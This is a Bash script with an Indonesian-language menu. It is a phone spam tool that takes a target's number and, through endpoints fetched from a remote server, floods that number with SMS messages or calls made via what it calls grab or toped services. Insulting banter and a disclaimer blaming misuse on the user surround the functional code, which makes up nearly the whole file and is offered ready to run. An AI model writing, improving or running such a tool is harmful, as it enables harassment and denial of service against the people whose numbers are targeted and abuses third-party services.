#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                                                                         ////
#////                             _____                      ___________.     ////
#////                        /     \   ____   _____   ___\__    ___/         ////
#////                      /  \ /  \_/ __ \ /     \_/ __ \|    |             ////
#////                     /    Y    \  ___/|  Y Y  \  ___/|    |             ////
#////                   \____|__  /\___  >__|_|  /\___  >____|             ////
#////                           \/     \/      \/     \/                  ////
#////                                                                     ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PEMAKAI
#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
troll(){
    clear
    sleep 0.03
    echo "         _ "
    sleep 0.03
    echo "        /_)  _.-===-._ "
    sleep 0.03
    echo "       /  .; '_-.'- .'.     _ "
    sleep 0.03
    echo "  __ _/  /.'\ ._  '. , \   (_\ "
    sleep 0.03
    echo " /\_( \  |.'.-._'- .  '|     \ "
    sleep 0.03
    echo " |_)  /  |/'    ''--''\|     _\__ "
    sleep 0.03
    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
    sleep 0.03
    echo " )/  (  \_      _      _/   \' (_| "
    sleep 0.03
    echo " /   /    \           /     _) (_/ "
    sleep 0.03
    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
    sleep 0.03
    echo " \    /  \ \  '''''  / / /     /   \ "
    sleep 0.03
    echo "  \_.'    \ \       / /  |   .' "
    sleep 0.03
    echo "   '--.,   \ \     / /  _;-'' "
    sleep 0.03
    echo "       '|   \ \   / /   | "
    sleep 0.03
    echo "       .;----'''''''----;. "
    sleep 0.03
    echo "      /(                 )\ "
    sleep 0.03
    echo "      \_''-------------''_/ "
    sleep 0.03
    echo "      | '';-----;-----;'' | "
    sleep 0.03
    echo "      | / : \ / : \ / : \ | "
    sleep 0.03
    echo "      |V.','.V.','.V.','.V| "
    sleep 0.03
    echo "      \'./_\.;./_\.;./_\.'/ "
    sleep 0.03
    echo "       ';..___________..;' "
    sleep 0.03
    echo " ============================="
    sleep 2
    echo " ==      Tools Spam      =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Mau lu pake lagi ga boejank?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Makasih boejank Dah make tools ini"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Ga jadi pilih no 3"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "TOols Spam SMS"
            #function spam
            echo
            echo "Masukkan nomor nya bngsd"
            echo contoh 081315126056
            read target # masukin no telp
            echo
            echo "Mau ngirim berapa sms lu?"
            read paket
            echo
            echo Nomor bener ga $target "Jumlah yang bakal lu kirim "$paket" bener ga bambank?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Spam ke nomor $target
                    echo
                    echo "Jangan Keluar Dulu goblok Sebelum selesai"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Makasih Boejank Dah make tools ini"
                    echo
                    echo " Dasar Jomblo bisa nya cuma nyepam "
                    echo " Presiden Memet"
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "TOols Spam Call"
            #function spam
            echo
            echo "Masukkan Nomornya Boejank"
            echo contoh 081315126056
            read target # masukin no telp
            echo
            echo "Pake Glab/Toped?"
            echo "[1] grab"
            echo "[2] toped"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Nomornya $target Spam pake $api_spam "bener ga boejank?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Lu bakal spam ke nomor $target
                  echo
                  echo "Jangan lu Pindah aplikasi bambank :v "
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Makasih Boejank Dah male tools ini :v"
                  echo
                  echo " Dasar jomblo kang coli :v"
                  echo " Presiden Memet"
                  echo "========================================"
            else
                  echo Ada yang salah boejank, coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Makasih Bambank Dah make TOols ini"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loanjing.."
load
clear
troll
echo Hey yoo Bngsd siapa nick lu? #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang ajg $nick ":v"
echo
echo "Mulai Aja Dulu :v"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
